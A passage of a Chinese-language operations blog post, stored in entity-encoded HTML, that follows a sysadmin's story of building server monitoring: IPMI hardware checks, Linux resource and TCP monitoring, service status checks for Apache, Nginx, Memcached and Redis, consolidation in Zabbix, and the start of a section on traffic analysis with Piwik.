0C;&#x7D22;&#x6027;&#x4E0D;&#x60F3;&#x4E86;&#xFF0C;&#x4ECE;&#x624B;&#x5934;&#x63A5;&#x89E6;&#x5230;&#x7684;&#x6162;&#x6162;&#x5F00;&#x59CB;&#x5427;,&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x51B3;&#x5B9A;&#x5148;&#x53BB;&#x673A;&#x623F;&#x770B;&#x770B;&#x3002;</p>\n<h4 id=\"2-1-&#x786C;&#x4EF6;&#x76D1;&#x63A7;\"><a href=\"#2-1-&#x786C;&#x4EF6;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.1 &#x786C;&#x4EF6;&#x76D1;&#x63A7;\"></a>2.1 &#x786C;&#x4EF6;&#x76D1;&#x63A7;</h4><p>&#x5230;&#x4E86;&#x673A;&#x623F;&#xFF0C;&#x5C0F;&#x738B;&#x770B;&#x7740;&#x516C;&#x53F8;&#x7684;&#x5404;&#x79CD;&#x54C1;&#x724C;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x60F3;&#x5230;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x60C5;&#x5C31;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#xFF0C;&#x6211;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x3002;</p>\n<p>&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x76D1;&#x63A7;&#x662F;&#x6700;&#x57FA;&#x7840;&#x7684;&#x76D1;&#x63A7;&#x624B;&#x6BB5;&#xFF0C;&#x6BD4;&#x5982;&#x5B9A;&#x671F;&#x7684;&#x7684;&#x673A;&#x623F;&#x5DE1;&#x68C0;&#x3002;</p>\n<p>&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x90FD;&#x4F1A;&#x6709;&#x8FDC;&#x7A0B;&#x63A7;&#x5236;&#x5361;&#xFF0C;&#x5982;Dell&#x7684;iDRAC,HP&#x7684;ILO&#x548C;IBM&#x7684;IMM&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Web&#x754C;&#x9762;&#x6765;&#x8FDB;&#x884C;&#x786C;&#x4EF6;&#x7684;&#x76D1;&#x63A7;&#x548C;&#x7BA1;&#x7406;&#x5DE5;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x8D2D;&#x4E70;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x6388;&#x6743;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x63A7;&#x5236;&#x53F0;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;</p>\n<p>&#x5728;Linux&#x4E0B;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x4F7F;&#x7528;IPMI&#x6765;&#x5B8C;&#x6210;&#x7269;&#x7406;&#x8BBE;&#x5907;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x3002;&#x901A;&#x5E38;&#x5FC5;&#x987B;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x5C31;&#x662F;&#x6E29;&#x5EA6;&#x3001;&#x786C;&#x76D8;&#x6545;&#x969C;&#x7B49;&#x3002;</p>\n<p>&#x5C0F;&#x738B;&#x7F16;&#x5199;&#x4E86;&#x81EA;&#x5DF1;&#x804C;&#x4E1A;&#x751F;&#x6DAF;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5C31;&#x662F;&#x4F7F;&#x7528;ipmi&#x5DE5;&#x5177;&#x83B7;&#x53D6;&#x6E29;&#x5EA6;&#x4F20;&#x611F;&#x5668;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5927;&#x4E8E;50&#x5C31;&#x53D1;&#x4E00;&#x4EFD;&#x90AE;&#x4EF6;&#x7ED9;&#x4ED6;&#xFF0C;&#x867D;&#x7136;&#x611F;&#x89C9;&#x4E0D;&#x9AD8;&#x7AEF;&#xFF0C;&#x4F46;&#x603B;&#x7B97;&#x662F;&#x6709;&#x4E00;&#x4E2A;&#x5F00;&#x59CB;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p>&#x6545;&#x969C;&#x56DE;&#x60F3;&#xFF1A;&#x4E4B;&#x524D;&#x6211;&#x53F8;&#x6258;&#x7BA1;&#x5728;&#x5317;&#x4EAC;&#x67D0;&#x673A;&#x623F;&#x7684;&#x8BBE;&#x5907;&#x5C31;&#x51FA;&#x73B0;&#x8FC7;&#xFF0C;&#x56E0;&#x4E3A;&#x521A;&#x597D;&#x6240;&#x5728;&#x673A;&#x67DC;&#x533A;&#x57DF;&#x7684;&#x7A7A;&#x8C03;&#x574F;&#x4E86;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#xFF0C;&#x7136;&#x540E;&#x7CFB;&#x7EDF;&#x5B95;&#x673A;&#x3002;</p>\n<h4 id=\"2-2-&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;\"><a href=\"#2-2-&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.2 &#x7CFB;&#x7EDF;&#x76D1;&#x63A7;\"></a>2.2 &#x7CFB;&#x7EDF;&#x76D1;&#x63A7;</h4><p>&#x5C0F;&#x738B;&#x4E0B;&#x4E00;&#x4E2A;&#x60F3;&#x5230;&#x7684;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF0C;&#x516C;&#x53F8;&#x5168;&#x662F;Linux&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x80AF;&#x5B9A;&#x662F;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x7684;&#x3002;</p>\n<p>&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x662F;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x4E3B;&#x8981;&#x7684;&#x5BF9;&#x8C61;&#x6709;&#xFF1A;</p>\n<p>1&#x3001;CPU<br>2&#x3001;Memory<br>3&#x3001;IO<br>4&#x3001;CPU&#xFF1A;&#x5173;&#x4E8E;CPU&#xFF0C;&#x6709;3&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x6982;&#x5FF5;&#xFF1A;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#xFF08;context switchs&#xFF09;&#xFF0C;&#x8FD0;&#x884C;&#x961F;&#x5217;&#xFF08;Run queue&#xFF09;&#x548C;&#x4F7F;&#x7528;&#x7387;&#xFF08;utilization&#xFF09;&#x3002;</p>\n<p>&#x8FD9;&#x4E5F;&#x662F;&#x6211;&#x4EEC;CPU&#x76D1;&#x63A7;&#x7684;&#x4E09;&#x4E2A;&#x91CD;&#x70B9;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x5904;&#x7406;&#x5668;&#x7684;&#x8FD0;&#x884C;&#x961F;&#x5217;&#x8981;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;3&#xFF0C;CPU &#x5229;&#x7528;&#x7387;&#x4E2D;user/system&#x6BD4;&#x4F8B;&#x7EF4;&#x6301;&#x5728;70/30&#xFF0C;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#x8981;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7E41;&#x5FD9;&#x7A0B;&#x5EA6;&#x6765;&#x7EFC;&#x5408;&#x8003;&#x91CF;&#x3002;</p>\n<p>&#x5E38;&#x7528;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6709;&#xFF1A;top vmstat mpstat</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n<p>&#x5185;&#x5B58;&#xFF1A;Linux&#x865A;&#x62DF;&#x5185;&#x5B58;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x4E1C;&#x4E1C;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x3001;SWAP&#x4F7F;&#x7528;&#x7387;&#x3001;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x7387;&#x66F2;&#x7EBF;&#x6765;&#x53D1;&#x73B0;&#x67D0;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x7B49;&#x3002;</p>\n<p>&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6709;&#xFF1A;free vmstat</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p>IO&#xFF1A;IO&#x5206;&#x4E3A;&#x78C1;&#x76D8;IO&#x548C;&#x7F51;&#x7EDC;IO&#x3002;&#x9664;&#x4E86;&#x5728;&#x505A;&#x6027;&#x80FD;&#x8C03;&#x4F18;&#x6211;&#x4EEC;&#x8981;&#x76D1;&#x63A7;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x6570;&#x636E;&#x5916;&#xFF0C;&#x90A3;&#x4E48;&#x65E5;&#x5E38;&#x76D1;&#x63A7;&#xFF0C;&#x53EA;&#x5173;&#x6CE8;&#x78C1;&#x76D8;&#x4F7F;&#x7528;&#x7387;&#x3001;io wait&#x5373;&#x53EF;&#xFF0C;&#x7F51;&#x7EDC;&#x4E5F;&#x662F;&#x76D1;&#x63A7;&#x7F51;&#x5361;&#x6D41;&#x91CF;&#x5373;&#x53EF;&#x3002;&#x5DE5;&#x5177;&#x6709;iostat iotop iftop&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/5.png\" alt=\"&#x56FE;&#x7247;5\"></p>\n<p>TCP&#x76D1;&#x63A7;&#xFF1A;&#x5728;&#x5F88;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#x6709;&#x5FC5;&#x8981;&#x76D1;&#x63A7;TCP&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;netstat&#x6216;&#x8005;ss&#x6765;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x7684;TCP&#x8FDE;&#x63A5;&#xFF0C;&#x6765;&#x5C55;&#x73B0;11&#x79CD;&#x4E0D;&#x540C;&#x7684;TCP&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5927;&#x5E76;&#x53D1;&#x4E2D;&#x53CA;&#x65F6;&#x53D1;&#x73B0;TCP&#x7684;&#x76F8;&#x5173;&#x6545;&#x969C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/6.png\" alt=\"&#x56FE;&#x7247;6\"></p>\n<p>&#x5176;&#x5B83;&#x7684;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x8FD8;&#x6709;&#x8FD0;&#x884C;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3001;&#x767B;&#x9646;&#x7528;&#x6237;&#x3001;Open File&#x7B49;&#x3002;</p>\n<h4 id=\"2-3-&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;\"><a href=\"#2-3-&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.3 &#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;\"></a>2.3 &#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;</h4><p>&#x5C0F;&#x738B;&#x628A;&#x786C;&#x4EF6;&#x76D1;&#x63A7;&#x548C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x7814;&#x7A76;&#x660E;&#x767D;&#x540E;&#xFF0C;&#x767B;&#x9646;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#xFF0C;&#x5076;&#x7136;&#x95F4;&#x4E00;&#x4E2A;ps aux&#xFF0C;&#x5C0F;&#x738B;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8FD0;&#x884C;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x90FD;&#x9700;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x554A;&#x3002;</p>\n<p>&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#x4E5F;&#x662F;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x4E2D;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>\n<p>Apache&#xFF1A;Apache&#x63D0;&#x4F9B;&#x4E86;mod_status&#x548C;mod_info&#x6A21;&#x5757;&#x7528;&#x6765;&#x8F93;&#x51FA;Apache&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5C0F;&#x738B;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5404;&#x79CD;grep&#x548C;awk&#x641E;&#x5B9A;&#x3002;<br>Nginx&#xFF1A;&#x540C;&#x6837;&#x6709;&#x72B6;&#x6001;&#x6A21;&#x5757;&#xFF0C;&#x7F16;&#x8BD1;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x2014;with-http_stub_status_module&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;stub_status on&#x6765;&#x5F00;&#x542F;&#x4E86;&#x3002;<br>Memcached&#xFF1A;&#x5C0F;&#x738B;&#x4F7F;&#x7528;nc&#x7ED9;memcached&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;stats&#x547D;&#x4EE4;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E86;&#x6240;&#x6709;&#x60F3;&#x8981;&#x7684;&#x4FE1;&#x606F;&#x3002;<br>Redis&#xFF1A;&#x5C0F;&#x738B;&#x8FD8;&#x662F;&#x4F7F;&#x7528;nc&#x7ED9;redis&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A;info&#x547D;&#x4EE4;&#x5C31;&#x83B7;&#x53D6;&#x5230;&#x4E86;redis&#x7684;&#x76F8;&#x5173;&#x72B6;&#x6001;&#x3002;<br>JVM&#xFF1A;&#x4F7F;&#x7528;jmconsole&#xFF0C;&#x6216;&#x8005;jmx&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8FDC;&#x7A0B;&#x76D1;&#x63A7;&#x3002;<br>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#xFF0C;&#x5C06;&#x7EBF;&#x4E0A;&#x7684;&#x5404;&#x79CD;&#x670D;&#x52A1;&#xFF0C;&#x90FD;&#x4E00;&#x4E2A;&#x4E00;&#x4E2A;&#x7684;&#x8FDB;&#x884C;&#x4E86;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x6837;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x7684;&#x8BE6;&#x7EC6;&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x5C31;&#x4E86;&#x5982;&#x6307;&#x638C;&#x4E86;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x5C06;&#x6240;&#x6709;&#x7684;API&#x63A5;&#x53E3;&#x72B6;&#x6001;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x6BD4;&#x5982;&#x901A;&#x8FC7;curl&#x68C0;&#x67E5;&#x8FD4;&#x56DE;&#x7684;HTTP&#x72B6;&#x6001;&#x7801;&#x3002;&#x6709;&#x6761;&#x4EF6;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;URL&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#xFF0C;&#x4E13;&#x95E8;&#x7528;&#x6765;&#x505A;&#x8FD9;&#x4E2A;&#x4E8B;&#x60C5;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/7.png\" alt=\"&#x56FE;&#x7247;7\"></p>\n<h4 id=\"2-4-&#x5F15;&#x5165;Zabbix\"><a href=\"#2-4-&#x5F15;&#x5165;Zabbix\" class=\"headerlink\" title=\"2.4 &#x5F15;&#x5165;Zabbix\"></a>2.4 &#x5F15;&#x5165;Zabbix</h4><p>&#x81EA;&#x4ECE;&#x5C0F;&#x738B;&#x63A5;&#x6536;&#x5230;&#x76D1;&#x63A7;&#x7684;&#x4EFB;&#x52A1;&#x540E;&#xFF0C;&#x8FD9;Shell&#x7F16;&#x7A0B;&#x80FD;&#x529B;&#x662F;&#x8D8A;&#x6765;&#x8D8A;&#x5F3A;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x6BCF;&#x5929;&#x4E00;&#x6253;&#x5F00;&#x90AE;&#x7BB1;&#x5C31;&#x88AB;&#x5404;&#x79CD;&#x62A5;&#x8B66;&#x6240;&#x6DF9;&#x6CA1;&#xFF0C;&#x811A;&#x672C;&#x591A;&#x800C;&#x6742;&#x4E71;&#x3002;</p>\n<p>&#x5C0F;&#x738B;&#x60F3;&#xFF0C;&#x6211;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x4EC0;&#x4E48;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x6765;&#x5E72;&#x8FD9;&#x4E9B;&#x4E8B;&#xFF0C;&#x4E0D;&#x80FD;&#x8FD9;&#x4E48;&#x5199;&#x811A;&#x672C;&#x4E0B;&#x53BB;&#x4E86;&#x3002;&#x4E8E;&#x662F;&#x5728;&#x7F51;&#x4E0A;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x641C;&#x7D22;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#x5982;Nagios&#x3001;Cacti&#x3001;Zabbix&#xFF0C;&#x539F;&#x6765;&#x81EA;&#x5DF1;&#x4E4B;&#x524D;&#x8D39;&#x90A3;&#x4E48;&#x5927;&#x52B2;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x65E9;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x3002;</p>\n<p>&#x7ECF;&#x8FC7;&#x76F8;&#x5173;&#x7684;&#x5BF9;&#x6BD4;&#xFF0C;&#x5C0F;&#x738B;&#x9009;&#x62E9;&#x4E86;Zabbix&#x3002;&#x7136;&#x540E;&#x4E4B;&#x524D;&#x7684;&#x6240;&#x6709;&#x76D1;&#x63A7;&#x8303;&#x7574;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x6574;&#x5408;&#x5230;Zabbix&#x4E2D;&#x3002;</p>\n<p>&#x786C;&#x4EF6;&#x76D1;&#x63A7;&#xFF1A;Zabbix IPMI Interface<br>&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF1A;Zabbix Agent Interface<br>Java&#x76D1;&#x63A7;&#xFF1A;Zabbix JMX Interface<br>&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x76D1;&#x63A7;&#xFF1A;Zabbix SNMP Interface<br>&#x5E94;&#x7528;&#x670D;&#x52A1;&#x76D1;&#x63A7;&#xFF1A;Zabbix Agent UserParameter<br>MySQL&#x6570;&#x636E;&#x5E93;&#x76D1;&#x63A7;&#xFF1A;percona-monitoring-plulgins<br>URL&#x76D1;&#x63A7;&#xFF1A;Zabbix Web &#x76D1;&#x63A7;  </p>\n<p>&#x8FD9;&#x4E00;&#x4E0B;&#x5B50;&#x628A;&#x4E4B;&#x524D;&#x5E72;&#x7684;&#x5DE5;&#x4F5C;&#x5168;&#x96C6;&#x6210;&#x5230;&#x4E00;&#x4E2A;&#x5E73;&#x53F0;&#x4E0A;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x4E4B;&#x524D;&#x7F16;&#x5199;&#x7684;&#x6240;&#x6709;&#x7684;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x7684;&#x76D1;&#x63A7;&#x811A;&#x672C;&#xFF0C;&#x7B80;&#x5355;&#x4FEE;&#x6539;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x7075;&#x6D3B;&#x7684;&#x8BBE;&#x7F6E;&#x62A5;&#x8B66;&#x9608;&#x503C;&#x3001;&#x544A;&#x8B66;&#x65B9;&#x5F0F;&#x3001;&#x544A;&#x8B66;&#x5347;&#x7EA7;&#x3001;&#x544A;&#x8B66;&#x53BB;&#x91CD;&#x3001;&#x544A;&#x8B66;&#x4F9D;&#x8D56;&#x7B49;&#x7B49;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x4F7F;&#x7528;Zabbix&#x7684;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#x529F;&#x80FD;&#x5B9E;&#x73B0;&#x4E0A;&#x7EBF;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540E;&#xFF0C;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x3002;</p>\n<p>&#x4F7F;&#x7528;Zabbix Proxy&#x5B9E;&#x73B0;&#x4E86;&#x591A;&#x673A;&#x623F;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x7B80;&#x76F4;&#x592A;&#x68D2;&#x4E86;&#x3002;</p>\n<p>&#x5BF9;&#x4E8E;&#x544A;&#x8B66;&#x901A;&#x77E5;&#xFF1A;&#x90AE;&#x4EF6;&#x3001;&#x5FAE;&#x4FE1;&#x3001;&#x77ED;&#x4FE1;&#x3001;&#x9489;&#x9489;&#x7B49;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x4E0E;Zabbix&#x5FEB;&#x901F;&#x7684;&#x96C6;&#x6210;&#xFF0C;&#x7F51;&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x6B64;&#x7C7B;&#x6587;&#x6863;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#xFF0C;&#x9488;&#x5BF9;&#x67D0;&#x4E9B;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x5904;&#x7406;&#x7684;&#x62A5;&#x8B66;&#xFF0C;Zabbix&#x53EF;&#x4EE5;&#x89E6;&#x53D1;Action&#x6765;&#x8F7B;&#x677E;&#x5E2E;&#x4F60;&#x5B9E;&#x73B0;&#xFF0C;&#x6545;&#x969C;&#x7684;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x3002;</p>\n<p>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x51C6;&#x5907;&#x5411;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#x5DE5;&#x4F5C;&#xFF0C;&#x6B64;&#x5904;&#x7701;&#x7565;300&#x5B57;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5230;10&#x5206;&#x949F;&#x5C0F;&#x738B;&#x5782;&#x76F4;&#x5934;&#x56DE;&#x6765;&#x4E86;&#x3002;&#x56E0;&#x4E3A;&#x7ECF;&#x7406;&#x95EE;&#x4E86;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5C0F;&#x738B;&#x56DE;&#x7B54;&#x4E0D;&#x4E0A;&#x6765;&#xFF1A;&#x5C0F;&#x738B;&#xFF0C;&#x4ECA;&#x5929;&#x54B1;&#x4EEC;&#x7F51;&#x7AD9;&#x7684;&#x6574;&#x4F53;PV&#x662F;&#x591A;&#x5C11;&#xFF1F;&#x73B0;&#x5728;&#x8BBF;&#x95EE;&#x6700;&#x591A;&#x7684;&#x9875;&#x9762;&#x662F;&#x54EA;&#x4E2A;&#xFF1F;</p>\n<h4 id=\"2-5-&#x6D41;&#x91CF;&#x5206;&#x6790;\"><a href=\"#2-5-&#x6D41;&#x91CF;&#x5206;&#x6790;\" class=\"headerlink\" title=\"2.5 &#x6D41;&#x91CF;&#x5206;&#x6790;\"></a>2.5 &#x6D41;&#x91CF;&#x5206;&#x6790;</h4><p>&#x5C0F;&#x738B;&#x9996;&#x5148;&#x60F3;&#x5230;&#x7684;&#x662F;&#x628A;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x62FF;&#x51FA;&#x6765;&#x5404;&#x79CD;awk&#x7136;&#x540E;sort&#x4E00;&#x4E0B;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x4ED6;&#x6CA1;&#x6709;&#x6025;&#x4E8E;&#x5F00;&#x59CB;&#xFF0C;&#x96BE;&#x9053;&#x5C31;&#x6CA1;&#x6709;&#x505A;&#x8FD9;&#x4E9B;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#x7684;&#x5DE5;&#x5177;&#x5417;&#xFF1F;</p>\n<p>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x53D1;&#x73B0;&#x4E86;google&#x5206;&#x6790;&#x3001;&#x767E;&#x5EA6;&#x7EDF;&#x8BA1;&#x3001;&#x7AD9;&#x957F;&#x5DE5;&#x5177;&#x7B49;&#x7B49;&#x4E00;&#x5806;&#x7EDF;&#x8BA1;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x5D4C;&#x5165;&#x4E00;&#x4E2A;js&#x5373;&#x53EF;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x5462;&#xFF1F;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x59CB;&#x7EC8;&#x662F;&#x5728;&#x5BF9;&#x65B9;&#x90A3;&#x91CC;&#xFF0C;&#x800C;&#x4E14;&#x529F;&#x80FD;&#x5B9A;&#x5236;&#x8D77;&#x6765;&#x4E5F;&#x4E0D;&#x65B9;&#x4FBF;&#xFF0C;&#x4E8E;&#x662F;google&#x5E2E;&#x52A9;&#x4E86;&#x4ED6;&#xFF0C;&#x4E00;&#x4E2A;&#x53EB;&#x505A;piwik&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x6620;&#x5165;&#x773C;&#x5E18;&#x3002;</p>\n<p>&#x7F51;&#x7AD9;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x5BF9;&#x4E8E;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x6765;&#x8BF4;&#xFF0C;&#x66F4;&#x662F;&#x4E00;&#x95E8;&#x5FC5;&#x987B;&#x638C;&#x63E1;&#x7684;&#x77E5;&#x8BC6;&#x4E86;&#x3002;&#x6BD4;&#x5982;&#x5BF9;&#x4E8E;&#x4E00;&#x5BB6;&#x7535;&#x5546;&#x516C;&#x53F8;&#x6765;&#x8BF4;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x8BA2;&#x5355;&#x6765;&#x6E90;&#x7684;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x6211;&#x4EEC;&#x5728;&#x67D0;&#x4E2A;&#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x5E7F;&#x544A;&#x6295;&#x5165;&#x6709;&#x6CA1;&#x6709;&#x6536;&#x5230;&#x9884;&#x671F;&#x7684;&#x6548;&#x679C;&#x3002;&#x53EF;&#x4EE5;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x5730;&#x533A;&#x7684;&#x8BBF;&#x95EE